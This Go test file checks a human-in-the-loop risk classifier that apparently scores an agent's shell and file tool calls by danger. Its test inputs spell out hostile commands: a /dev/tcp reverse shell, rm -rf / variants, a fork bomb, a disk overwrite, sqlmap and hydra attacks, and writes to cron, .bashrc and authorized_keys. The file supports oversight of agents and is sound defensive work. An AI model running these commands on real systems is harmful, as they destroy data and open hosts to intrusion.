package hitl

import (
	"encoding/json"
	"testing"
)

func terminal(input string, detach bool) json.RawMessage {
	b, _ := json.Marshal(terminalArgs{Input: input, Detach: detach})
	return b
}

func file(action, path string) json.RawMessage {
	b, _ := json.Marshal(fileArgs{Action: action, Path: path})
	return b
}

func TestClassifier_Classify_ScoresTerminalCommandsByWhatTheyDo(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  RiskClass
	}{
		{"read-only listing", "ls -la /work", RiskLow},
		{"read-only with path prefix", "/usr/bin/cat /etc/hostname", RiskLow},
		{"grep over files", "grep -r password /work", RiskLow},
		{"a plain build step", "make build", RiskMedium},
		{"an outbound fetch", "curl https://example.com/report", RiskMedium},
		{"a network scan", "nmap -sV 10.0.0.1", RiskMedium},
		{"a credentialed GET is not a write", "curl https://t/login?user=admin", RiskMedium},
		{"an exploitation tool", "sqlmap -u https://t/p?id=1 --dump", RiskHigh},
		{"a password cracker", "hydra -l root -P list ssh://t", RiskHigh},
		{"a reverse shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", RiskHigh},
		{"a login brute-force POST", `curl -X POST --data "password=x" https://t/login`, RiskHigh},
		{"a recursive root delete", "rm -rf /", RiskBlocked},
		{"a fork bomb", ":(){ :|:& };:", RiskBlocked},
		{"a disk overwrite", "dd if=/dev/zero of=/dev/sda", RiskBlocked},
		{"split recursive force flags", "rm -r -f /", RiskBlocked},
		{"a root glob delete", "rm -rf /*", RiskBlocked},
		{"a home delete", "rm -rf ~", RiskBlocked},
		{"a delete that keeps the safety off", "rm --no-preserve-root -rf /", RiskBlocked},
		{"a scratch directory delete", "rm -rf /tmp/build", RiskMedium},
		{"a file name that contains a tool name", "cat johnson.txt", RiskLow},
		{"a log name that contains a blocked word", "cat shutdown.log", RiskLow},
		{"a read-only word chained to a script", "cat x; python3 payload.py", RiskMedium},
		{"a read-only word chained to a fetch", "ls && curl https://t/x", RiskMedium},
		{"a read-only word redirected into a file", "echo hi > out.txt", RiskMedium},
		{"a redirect into a start-up file", "echo 'x' >> ~/.bashrc", RiskHigh},
		{"a redirect into a system directory", "echo pwned > /etc/cron.d/x", RiskHigh},
		{"a find that deletes", "find / -name '*.log' -delete", RiskMedium},
		{"a find that executes", "find . -exec sh {} ;", RiskMedium},
		{"env running a program", "env X=1 ./exploit", RiskMedium},
		{"a command substitution", "echo $(id)", RiskMedium},
		{"a pipeline of read-only commands", "ps aux | grep sshd | wc -l", RiskLow},
		{"stderr folded into stdout", "ls /work 2>&1", RiskLow},
		{"output discarded", "ls /work > /dev/null", RiskLow},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := Classify("terminal", true, terminal(tc.input, false))
			if got.Risk != tc.want {
				t.Fatalf("%q classified %s (%s), want %s", tc.input, got.Risk, got.Reason, tc.want)
			}
			if got.Reason == "" {
				t.Fatal("a classification must carry a reason for the operator")
			}
		})
	}
}

func TestClassifier_Classify_TreatsADetachedCommandAsMedium(t *testing.T) {
	if got := Classify("terminal", true, terminal("python3 -m http.server 8000", true)); got.Risk != RiskMedium {
		t.Fatalf("a detached server classified %s, want medium", got.Risk)
	}
	// The same command, not detached and not otherwise flagged, is a side-effect medium too,
	// but a bare read-only command detached stays low only when read-only; detach lifts it.
	if got := Classify("terminal", true, terminal("ls", true)); got.Risk != RiskMedium {
		t.Fatalf("a detached ls classified %s, want medium (detach is the reason)", got.Risk)
	}
}

func TestClassifier_Classify_ScoresFileWritesByPath(t *testing.T) {
	tests := []struct {
		name   string
		action string
		path   string
		want   RiskClass
	}{
		{"a read", "read_file", "/etc/passwd", RiskLow},
		{"a write to the workspace", "write_file", "/work/out.txt", RiskMedium},
		{"a write under etc", "write_file", "/etc/cron.d/x", RiskHigh},
		{"an ssh key write", "edit_file", "/root/.ssh/authorized_keys", RiskHigh},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := Classify("file", true, file(tc.action, tc.path)); got.Risk != tc.want {
				t.Fatalf("%s %s classified %s, want %s", tc.action, tc.path, got.Risk, tc.want)
			}
		})
	}
}

func TestClassifier_Classify_FlagsUnparseableSandboxCallsHigh(t *testing.T) {
	if got := Classify("terminal", true, json.RawMessage(`{not json`)); got.Risk != RiskHigh {
		t.Fatalf("an unparseable terminal call classified %s, want high", got.Risk)
	}
	if got := Classify("file", true, json.RawMessage(`{`)); got.Risk != RiskHigh {
		t.Fatalf("an unparseable file call classified %s, want high", got.Risk)
	}
}

func TestClassifier_Classify_TreatsNonSandboxToolsAsLow(t *testing.T) {
	// A non-environment tool is an orchestration step, scored low whatever its
	// arguments look like — even arguments that would be blocked in a shell.
	if got := Classify("pentester", false, terminal("rm -rf /", false)); got.Risk != RiskLow {
		t.Fatalf("a delegation tool classified %s, want low", got.Risk)
	}
}
